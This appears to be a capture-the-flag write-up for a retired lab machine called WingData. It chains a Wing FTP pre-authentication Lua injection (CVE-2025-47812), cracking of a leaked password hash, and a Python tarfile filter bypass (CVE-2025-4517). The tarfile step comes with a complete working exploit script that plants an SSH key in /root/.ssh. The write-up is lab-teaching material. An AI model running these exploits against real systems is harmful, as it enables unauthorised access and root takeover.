# WingData

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--02--14-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | February 14, 2026 |
| **Rating** | 3.8 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Wing FTP Server 7.4.3 behind Apache is vulnerable to **CVE-2025-47812**, a pre-authentication null-byte Lua injection: the C++ auth layer truncates the username at the null byte and sees `anonymous`, while the full string — including injected Lua — is written to the session file and executed when it is next loaded. That gives command execution as `wingftp`. Wing FTP's user config files are readable, so `wacky`'s salted SHA-256 password hash can be extracted and cracked, and the password is reused for SSH. Root exploits **CVE-2025-4517**, a Python 3.12 `tarfile` `data_filter` bypass via PATH_MAX overflow, through a sudo-permitted backup-restore script that extracts user-supplied tar archives as root.

---

## Attack Chain

```
CVE-2025-47812 (Wing FTP null-byte RCE as wingftp)
  → Extract salted SHA-256 hash from wacky.xml + crack with hashcat
    → SSH as wacky (user flag)
      → CVE-2025-4517 (Python tarfile data_filter bypass)
        → Write SSH key to /root/.ssh/ via sudo tar restore script (root flag)
```

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sC -Pn -T4 10.129.x.x
```

Open ports: **22** (SSH) and **80** (HTTP — Apache 2.4.66).

Browsing to `http://10.129.x.x` redirects to `http://wingdata.htb`. The main site contains a link to a "Client Portal" at `http://ftp.wingdata.htb`.

### Hosts File

```bash
echo "10.129.x.x wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Wing FTP Identification

Navigating to `http://ftp.wingdata.htb` reveals a Wing FTP Server web login interface at `/login.html`. The server version is ≤ 7.4.3, which is vulnerable to CVE-2025-47812.

---

## Foothold — CVE-2025-47812 (Pre-Auth RCE)

### Vulnerability

CVE-2025-47812 is a CVSS 10.0 pre-authentication RCE in Wing FTP Server < 7.4.4. A null-byte in the username parameter during login causes the C++ authentication layer to truncate and see a valid username (e.g., `anonymous`), while the full unsanitized string — including injected Lua code — is written to a `.lua` session file. When the session file is loaded on a subsequent request, the injected Lua executes as the Wing FTP service user.

### Exploit

Use the 4m3rr0r PoC from GitHub:

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc
```

Confirm RCE:

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "id" -v
```

Output:

```
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),...
```

### Important Notes

- The `anonymous` FTP account has a concurrent session limit. If the exploit returns "too many users logged to this account," you need to logout stale sessions first:

```bash
curl -sk "http://ftp.wingdata.htb/logout.html" \
  -H "Cookie: UID=<session_id>" > /dev/null
```

- Reverse shells do **not** work — outbound connections from the target are filtered. This CVE is used for **command execution only**, not for obtaining a shell.

- Commands that return XML content may appear empty due to the PoC's output parsing. Use `base64` to encode output when reading XML files.

---

## User Flag — Hash Cracking + SSH

### Extract Password Hash

The Wing FTP user config files are world-readable by the `wingftp` user. The target system user `wacky` (uid=1001) also has a Wing FTP account:

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
  -c "grep Password /opt/wftpserver/Data/1/users/wacky.xml" -v
```

Output:

```
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

### Get the Salt

Wing FTP uses salted SHA-256 hashing. The salt is in the domain settings file:

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
  -c "base64 /opt/wftpserver/Data/1/settings.xml" -v
```

Decode the base64 output and look for:

```xml
<SaltingString>WingFTP</SaltingString>
<EnablePasswordSalting>1</EnablePasswordSalting>
```

The salt is **`WingFTP`**.

### Crack with Hashcat

The hash format is `sha256($pass.$salt)` — hashcat mode **1410**:

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

Result:

```
wacky: !#7Blushing^*Bride5
```

### SSH as Wacky

```bash
ssh wacky@wingdata.htb
# Password: !#7Blushing^*Bride5
```

```bash
cat ~/user.txt
```

**User flag** captured.

---

## Privilege Escalation — CVE-2025-4517 (Python tarfile filter bypass)

### Sudo Permissions

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

### The Backup Script

The script at `/opt/backup_clients/restore_backup_clients.py`:

1. Validates backup filename matches `backup_<digits>.tar`
2. Reads the tar from `/opt/backup_clients/backups/` (writable by wacky)
3. Creates a staging directory under `/opt/backup_clients/restored_backups/`
4. Extracts with `tar.extractall(path=staging_dir, filter="data")`

The `filter="data"` in Python 3.12 is supposed to prevent path traversal, symlinks to absolute paths, SUID bits, etc. However, **Python 3.12.3** (the exact version on this machine) is vulnerable to **CVE-2025-4517**.

### CVE-2025-4517 — tarfile data_filter PATH_MAX Bypass

This vulnerability exploits a bug where `os.path.realpath()` silently stops resolving symlinks when the resolved path exceeds `PATH_MAX` (4096 bytes on Linux). The attack creates a chain of short symlinks that individually stay within bounds, but when fully resolved would exceed PATH_MAX. The final symlink in the chain — pointing outside the extraction directory — is never validated by `realpath()`, allowing arbitrary file writes.

### Exploit

Generate an SSH key and create the malicious tar:

```bash
cd /tmp && mkdir -p exploit && cd exploit
ssh-keygen -t ed25519 -f /tmp/exploit/rootkey -N "" -q
```

```bash
cat << 'PYEOF' > /tmp/rootpwn.py
import tarfile
import os
import io
import sys

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/opt/backup_clients/backups/backup_7001.tar", mode="x") as tar:
    # Build symlink chain that exceeds PATH_MAX when resolved
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    # Final symlink that won't be resolved (beyond PATH_MAX)
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)

    # Escape symlink pointing to /root/.ssh
    e2 = tarfile.TarInfo("escape2")
    e2.type = tarfile.SYMTYPE
    e2.linkname = linkpath + "/../../../../root/.ssh"
    tar.addfile(e2)

    # Write SSH public key through the escaped symlink
    keydata = open("/tmp/exploit/rootkey.pub", "rb").read()
    k = tarfile.TarInfo("escape2/authorized_keys")
    k.type = tarfile.REGTYPE
    k.size = len(keydata)
    tar.addfile(k, fileobj=io.BytesIO(keydata))

print("[+] CVE-2025-4517 tar created!")
PYEOF
python3 /tmp/rootpwn.py
```

Run the sudo script to extract the malicious tar as root:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_7001.tar -r restore_root1
```

SSH as root:

```bash
ssh -i /tmp/exploit/rootkey -o StrictHostKeyChecking=no root@localhost "cat /root/root.txt"
```

**Root flag** captured.

---

## CVE Reference

| CVE | Description | CVSS | Used For |
|-----|-------------|------|----------|
| CVE-2025-47812 | Wing FTP Server null-byte Lua injection (pre-auth RCE) | 10.0 | Foothold (RCE as wingftp) |
| CVE-2025-4517 | Python tarfile data_filter PATH_MAX bypass (arbitrary writes) | 10.0 | Privilege escalation (root) |

## Key Takeaways

- Wing FTP Server runs as a regular user on this box (`wingftp`, uid=1000), not as root — so the CVE-2025-47812 RCE alone doesn't give root.
- Outbound connections are filtered, so reverse shells don't work. Use the RCE for command execution only.
- Wing FTP password hashes use salted SHA-256 with the salt stored in `/opt/wftpserver/Data/1/settings.xml`. The hashcat mode is **1410** (`sha256($pass.$salt)`).
- The `EnableSHA256>0` in the global `settings.xml` is misleading — check the **domain** settings.xml under `Data/1/` for the actual salt configuration.
- Python 3.12.3's `tarfile` `data_filter` is bypassable via CVE-2025-4517. Any sudo script that extracts user-controlled tar archives with `filter="data"` on an unpatched Python 3.12 is exploitable.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
